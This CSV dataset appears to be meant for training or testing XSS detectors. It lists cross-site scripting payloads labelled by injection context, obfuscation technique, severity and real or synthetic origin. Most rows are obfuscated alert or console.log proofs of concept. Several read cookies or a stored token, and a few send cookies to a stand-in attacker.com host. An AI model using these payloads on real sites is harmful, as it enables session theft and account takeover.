payload,context,technique,severity,length,source
<button popovertarget=x>Click me</button><var ontoggle=alert(1) popover id=x>AnonKryptiQuz</var>,tag_injection,none,medium,96,real
"location=""javascr	ipt:XMLHttpRequest(document.cookie)""",dom_sink,synthetic,high,54,synthetic
&quot; onanimationiteration=console.log(1) x=&quot;,attribute_escape,synthetic,medium,51,synthetic
"setTimeout(%22console.log(document.cookie+%27&loc=%27+location.href)%22,0)",dom_sink,synthetic,high,74,synthetic
<em contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56,real
`><img src=x ondrop=\u0061lert('XSS')>,attribute_escape,synthetic,low,38,synthetic
"onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,74,synthetic
onp&#97;st&#101;=confirm/*x*/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,55,synthetic
"""><script>consol&#101;.log(docum&#101;nt.dom&#97;in)</script>",script_injection,synthetic,low,61,synthetic
<shadow contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
"<applet code=""javascript:confirm(document.cookie);"">",dom_sink,none,high,52,real
%22><a onmozfullscreenchange=alert(location.hash)>,tag_injection,synthetic,medium,50,synthetic
 ongesturestart=console.log(location.hash),event_handler,synthetic,medium,42,synthetic
"<keygen onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",tag_injection,none,medium,71,real
"onbeforecopy=javascript:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
<source id=x tabindex=1 onfocusin=alert(1)></source>,tag_injection,none,medium,52,real
<anImaTemOtiOn OndBlcLicK=cOnsOle.loG(1)/>,tag_injection,synthetic,medium,42,synthetic
__proto__[%22ontouchmove%22]=console.log(btoa(document.cookie)),dom_sink,synthetic,high,63,synthetic
"onanimationiteration=console.log/**/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,67,synthetic
"\"" OnrEseT=aLerT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,49,synthetic
"<body style=""background:gray"">",attribute_escape,none,low,30,real
<label onpointerenter=alert(1) style=display:block>AnonKryptiQuz</label>,tag_injection,none,medium,72,real
"<blink onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",tag_injection,none,medium,65,real
 onload=prompt(document.domain),event_handler,synthetic,medium,31,synthetic
${alert(%27XSS%27)|n},template_injection,synthetic,medium,21,synthetic
<anImaTetRanSfoRm OncOntExtMenU=pRomPt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,56,synthetic
"<!--><div onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,74,synthetic
"onpointercancel=\u0061lert&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,65,synthetic
"<buTtoN
oNdrAgeNteR=aLerT(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,41,synthetic
"'><img src=x ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,90,synthetic
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionstart=alert(1)></map>",tag_injection,none,medium,106,real
${{\u0061lert('XSS')}},template_injection,synthetic,low,22,synthetic
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionend=alert(1)></dfn>",tag_injection,none,medium,104,real
"<img2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</img2>",tag_injection,none,medium,89,real
"<iframe2 onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",tag_injection,none,medium,75,real
"""><dialog onpointerover=confirm(1)>",tag_injection,synthetic,medium,35,synthetic
""" ><svG oNprOmpTdiSmiSs=ProMpt(1)>",attribute_escape,synthetic,medium,34,synthetic
<listing/onkeyup=\u0061lert(location.hash)>,tag_injection,synthetic,low,43,synthetic
"""><svg onload=prompt(document.domain);>.aspx",dom_sink,none,medium,44,real
"<legend draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</legend>",tag_injection,none,medium,70,real
"SetIntErvAl(""coNfiRm('XSS')"",100)",dom_sink,synthetic,high,33,synthetic
"OnpOinTerOveR=jAvaScrIpt:alErt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,61,synthetic
{{ &#97;l&#101;rt(docum&#101;nt.cooki&#101;) }},template_injection,synthetic,low,47,synthetic
"&quot; onpromptdismiss=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,70,synthetic
"<a href=""\x18javascript:javascript:alert(8404)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<legend onmouseout=""alert(1)"">AnonKryptiQuz</legend>",tag_injection,none,medium,52,real
redirect.asp?url=javascript://%250Aalert(document.domain),dom_sink,url_encoding,medium,57,real
onmouseenter=javascript:alert(location.hash),event_handler,synthetic,medium,44,synthetic
"<title oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,tag_injection,none,medium,56,real
"`%3E%3Cimg src=x ontouchstart=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,69,synthetic
' onhashchange=\u0061lert('XSS') ',attribute_escape,synthetic,low,34,synthetic
<a OnsEarCh=AleRt(1)>,tag_injection,synthetic,medium,21,synthetic
%3Cblink src=x onmouseup=alert(1)%3E,tag_injection,synthetic,medium,36,synthetic
<tiTle onStaLleD=aLerT('XSS')/>,tag_injection,synthetic,medium,31,synthetic
<maTh OncOpy=coNsoLe.Log(doCumEnt.doMaiN) OncOpy=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,78,synthetic
"<&#101;mb&#101;d
onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,89,synthetic
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>",tag_injection,none,medium,107,real
"location.href=""javascr	ipt:confirm('//attacker.com/?c='+document.cookie)""",dom_sink,synthetic,high,73,synthetic
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,84,real
"<table onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</table>",tag_injection,none,medium,68,real
<set src=x onclose=confirm(document.domain)>,tag_injection,synthetic,medium,44,synthetic
""" ><svg onpromptdismiss=prompt(1)>",attribute_escape,synthetic,medium,34,synthetic
 onsubmit=\u0061lert(location.hash),event_handler,synthetic,low,35,synthetic
"\"" onkeypress=alert(1)//",attribute_escape,synthetic,medium,24,synthetic
"location=""javascr	ipt:console.log(location.hash)""",dom_sink,synthetic,high,49,synthetic
""" ><svG oNpoIntErrAwuPdaTe=AleRt(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,tag_injection,none,medium,78,real
""" oNtoUchEnd=alErt('XSS') """,attribute_escape,synthetic,medium,27,synthetic
	onFocUsoUt=AleRt('XSS'),event_handler,synthetic,medium,24,synthetic
\%22 onscrollsnapchange=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,44,synthetic
" onFocUsoUt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,54,synthetic
"%22 onpointerover=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,60,synthetic
"""%3E%3Cimg src=x onload=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,63,synthetic
<span onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
"<del onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,79,real
&quot; onpopstate=\u0061lert(document.domain) x=&quot;,attribute_escape,synthetic,low,54,synthetic
"<meter onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</meter>",tag_injection,none,medium,65,real
' onmousewheel=alert(document.domain) ',attribute_escape,synthetic,medium,39,synthetic
onwebkitanimationend=\u0061lert/*x*/(1),event_handler,synthetic,low,39,synthetic
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",script_injection,none,medium,90,real
""" ><svg onwh&#101;&#101;l=&#97;l&#101;rt('XSS')>",attribute_escape,synthetic,low,48,synthetic
"__proto__[""oncut""]=console.log(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,86,synthetic
"<style>:target {transform: rotate(180deg);}</style><param id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></param>",tag_injection,none,medium,128,real
onr&#101;s&#101;t=&#97;l&#101;rt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,66,synthetic
\%22 onkeydown=alert(%27XSS%27)//,attribute_escape,synthetic,medium,33,synthetic
"	ondr&#97;gov&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,67,synthetic
<template onended=prompt(%27XSS%27)/>,tag_injection,synthetic,medium,37,synthetic
__proto__[%22onanimationiteration%22]=prompt(document.cookie),dom_sink,synthetic,high,61,synthetic
" onmozfullscreenchange=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
"__proto__[""ons&#101;&#97;rch""]=f&#101;tch(1)",dom_sink,synthetic,low,44,synthetic
"<rtc onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,65,real
"<body onpagehide body onpagehide=""javascript:javascript:alert(9591)""></body onpagehide>",js_uri,none,medium,87,real
OngOtpOinTerCapTurE=pRomPt&#40;loCatIon.haSh&#41;,event_handler,synthetic,low,49,synthetic
<!--><script onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,93,synthetic
' ><svG oNfoCus=prOmpT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,38,synthetic
"<col onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</col>",tag_injection,none,medium,61,real
"<article onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</article>",tag_injection,none,medium,71,real
%3F%20javascript:alert(1),js_uri,url_encoding,medium,25,real
<!--><base oninput=\u0061lert('XSS')>,tag_injection,synthetic,low,37,synthetic
onk&#101;yup=confirm(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,43,synthetic
"<video onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</video>",tag_injection,none,medium,63,real
"s&#101;tTim&#101;out(""prompt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"",0)",dom_sink,synthetic,medium,133,synthetic
"<tt onmouseout=""alert(1)"">AnonKryptiQuz</tt>",tag_injection,none,medium,44,real
"<nextid onclick=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",tag_injection,none,medium,69,real
<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,js_uri,none,high,169,real
"__proto__[%22onplaying%22]=fetch(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,63,synthetic
' onbeforepaste=\u0061lert('XSS') ',attribute_escape,synthetic,low,35,synthetic
""" oNwhEel=coNsoLe.Log(loCatIon.haSh) """,attribute_escape,synthetic,medium,38,synthetic
<iframe onpointerenter=alert(1) style=display:block>AnonKryptiQuz</iframe>,tag_injection,none,medium,74,real
"<ul draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",tag_injection,none,medium,80,real
"""><img src=x onpl&#97;y=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,58,synthetic
`><img src=x onclick=prompt('XSS')>,attribute_escape,synthetic,medium,35,synthetic
"""><VidEo OndRagStaRt=AleRt('XSS')>",tag_injection,synthetic,medium,34,synthetic
""" ongestureend=\u0061lert(1) """,attribute_escape,synthetic,low,30,synthetic
%3Cbase onbeforecopy=console.log(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
"""><s&#101;t onfocus=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,53,synthetic
"<time onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,83,real
<marquee onpointermove=alert(1) style=display:block>AnonKryptiQuz</marquee>,tag_injection,none,medium,75,real
"<noscript onb&#101;for&#101;m&#97;tch=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,86,synthetic
\' OndRop=coNfiRm(DocUmeNt.DomAin)//,attribute_escape,synthetic,medium,36,synthetic
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=eval(document.cookie)%3E"")",dom_sink,synthetic,high,87,synthetic
"<shadow ondblclick=""alert(1)"">AnonKryptiQuz</shadow>",tag_injection,none,medium,52,real
onmouseover=prompt(1)>OnMouseOve,event_handler,none,medium,32,real
OnpLayIng=coNsoLe.Log(doCumEnt.doMaiN),event_handler,synthetic,medium,38,synthetic
""" onanimationiteration=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,67,synthetic
"<applet onmousedown=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,53,real
onwebkittransitionend=alert&#40;location.hash&#41;,event_handler,synthetic,low,50,synthetic
'><img src=x on&#101;nd&#101;d=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,49,synthetic
'><img src=x ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,90,synthetic
"<center onmouseup=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,51,real
<label onpointerleave=alert(1) style=display:block>AnonKryptiQuz</label>,tag_injection,none,medium,72,real
"<style>:target {transform: rotate(180deg);}</style><map id=x style=""transition:transform 2s"" ontransitionrun=print()></map>",tag_injection,none,low,123,real
<svg><basefont onload=alert(1)></basefont>,tag_injection,none,medium,42,real
oncanplay=console.log('XSS'),event_handler,synthetic,medium,28,synthetic
"__proto__[%22ontouchend%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,94,synthetic
'><Img srC=x onResEt=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,40,synthetic
"<img
onkeypress=console.log(1)>",tag_injection,synthetic,medium,31,synthetic
' ><svG oNmoUseDowN=cOnfIrm(1)>,attribute_escape,synthetic,medium,31,synthetic
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable style=display:block>drop here</wbr>",tag_injection,none,medium,127,real
"OnsUbmIt=JavAscRipT:cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,58,synthetic
\' OnaNimAtiOniTerAtiOn=ProMpt(1)//,attribute_escape,synthetic,medium,35,synthetic
"""><img src=x onfocusout=\u0061lert(location.hash)>",attribute_escape,synthetic,low,50,synthetic
%22 ><svg onbeforecut=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
"<table onmouseover=""alert(1)"">AnonKryptiQuz</table>",tag_injection,none,medium,51,real
anythinglr00</script><script>alert(document.domain)</script>uxldz,dom_sink,none,medium,65,real
<tr ontoggle=console.log(document.domain) ontoggle=console.log(document.domain)>,tag_injection,synthetic,medium,80,synthetic
""" onfullscreenchange=\u0061lert(location.hash) """,attribute_escape,synthetic,low,48,synthetic
`><img src=x onend=confirm('XSS')>,attribute_escape,synthetic,medium,34,synthetic
ondblclick=console.log(1),event_handler,synthetic,medium,25,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""f&#101;tch(1)""",dom_sink,synthetic,low,82,synthetic
<noscript	ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,61,synthetic
' ><svG oNloAd=AleRt(1)>,attribute_escape,synthetic,medium,24,synthetic
"""><img src=x onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,105,synthetic
"<body draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</body>",tag_injection,none,medium,66,real
<header onpointerdown=alert(1) style=display:block>AnonKryptiQuz</header>,tag_injection,none,medium,73,real
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,js_uri,html_entity,medium,78,real
 onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,84,synthetic
"%22 onbegin=alert(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,52,synthetic
&#X03C,generic,html_entity,low,6,real
%22 onfocusin=prompt(1) %22,attribute_escape,synthetic,medium,27,synthetic
%22><img src=x onfocusin=console.log(location.hash)>,attribute_escape,synthetic,medium,52,synthetic
"\' ondblclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,70,synthetic
""" ><svg onkeypress=alert(1)>",attribute_escape,synthetic,medium,28,synthetic
<s&#101;l&#101;ct/onmous&#101;wh&#101;&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,87,synthetic
"onpointercancel=alert&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,60,synthetic
'><img src=x onbeforepaste=\u0061lert('XSS')>,attribute_escape,synthetic,low,45,synthetic
"d&#97;t&#97;:t&#101;xt/html,<script>&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>",js_uri,synthetic,low,82,synthetic
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationstart=""alert(1)""></marquee>",tag_injection,none,medium,101,real
"<!--><form onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,117,synthetic
<tr src=x ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,67,synthetic
<rp onpointermove=alert(1) style=display:block>AnonKryptiQuz</rp>,tag_injection,none,medium,65,real
"element.setAttribute(""onclick"",""confirm(document.domain)"")",dom_sink,synthetic,medium,58,synthetic
"<style>:target {color:red;}</style><script id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></script>",script_injection,none,medium,116,real
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=pRomPt(LocAlSTorAge.geTItEm('toKen'))>"")",dom_sink,synthetic,high,99,synthetic
"<template onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></template>",tag_injection,none,medium,289,real
<command onpointerenter=alert(1) style=display:block>AnonKryptiQuz</command>,tag_injection,none,medium,76,real
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=console.log(document.domain) )//%0D%0A%0d%0a",js_uri,synthetic,medium,90,synthetic
onpoint&#101;rdown=j&#97;v&#97;script:prompt(1),event_handler,synthetic,medium,47,synthetic
"location=""javascript:alert(btoa(document.cookie))""",dom_sink,synthetic,high,50,synthetic
